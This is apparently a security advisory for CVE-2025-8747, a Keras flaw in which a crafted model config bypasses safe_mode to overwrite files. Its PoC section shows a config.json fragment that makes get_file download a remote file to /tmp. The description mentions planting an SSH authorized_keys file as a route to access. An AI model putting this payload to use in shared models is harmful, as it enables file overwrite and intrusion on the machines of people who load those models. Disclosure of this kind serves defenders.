---
description: CVE-2025-8747 High severity. Keras untrusted model arbitrary file write
title: Keras untrusted model arbitrary file write
date_published: "2025-08-12"
last_updated: "2025-08-12"
xray_id:
vul_id: CVE-2025-8747
cvss: 8.8
severity: high
discovered_by: Andrey Polkovnichenko
type: vulnerability
---
## Summary
This vulnerability allows attackers to perform an arbitrary file overwrite when an untrusted Keras v3 model is loaded, even when `safe_mode` is enabled. This can lead to arbitrary code execution in many cases.



## Component

[keras](https://github.com/keras-team/keras/)



## Affected versions

 [3.0.0,3.11.0)



## Description

Keras’ [safe_mode](https://www.tensorflow.org/api_docs/python/tf/keras/models/load_model) flag is designed to disallow unsafe lambda deserialization - specifically by rejecting any arbitrary embedded Python code, marked by the “**lambda**” class name.

A fix to CVE-2025-1550, allowing deserialization of the object only from internal Keras modules, was introduced in the commit [bb340d6780fdd6e115f2f4f78d8dbe374971c930](https://github.com/keras-team/keras/commit/bb340d6780fdd6e115f2f4f78d8dbe374971c930).

```
package = module.split(".", maxsplit=1)[0]
if package in {"keras", "keras_hub", "keras_cv", "keras_nlp"}:
```

However, it is still possible to exploit model loading, for example by reusing the internal Keras function `keras.utils.get_file`, and download remote files to an attacker-controlled location.

This allows for arbitrary file overwrite which in many cases could also lead to remote code execution. For example, an attacker would be able to download a malicious `authorized_keys` file into the user’s SSH folder, giving the attacker full SSH access to the victim’s machine.
Since the model does not contain arbitrary Python code, this scenario will not be blocked by “safe_mode”. It will bypass the latest fix since it uses a function from one of the approved modules (`keras`).



## PoC

The following truncated `config.json` will cause a remote file download from https://raw.githubusercontent.com/andr3colonel/when_you_watch_computer/refs/heads/master/index.js to the local `/tmp` folder, by sending arbitrary arguments to Keras’ builtin function `keras.utils.get_file()` -

```json
  {
                "class_name": "Lambda",
                "config": {
                    "arguments": {
                        "origin": "https://raw.githubusercontent.com/andr3colonel/when_you_watch_computer/refs/heads/master/index.js",
                        "cache_dir":"/tmp",
                        "cache_subdir":"",
                        "force_download": true},
                    "function": {
                        "class_name": "function",
                        "config": "get_file",
                        "module": "keras.utils"
                    }
                },
```



## Vulnerability Mitigations

No mitigations are supplied for this issue



## References

[Advisory](https://github.com/keras-team/keras/security/advisories/GHSA-c9rc-mg46-23w3)

[Technical blog](https://jfrog.com/blog/keras-safe_mode-bypass-vulnerability/)

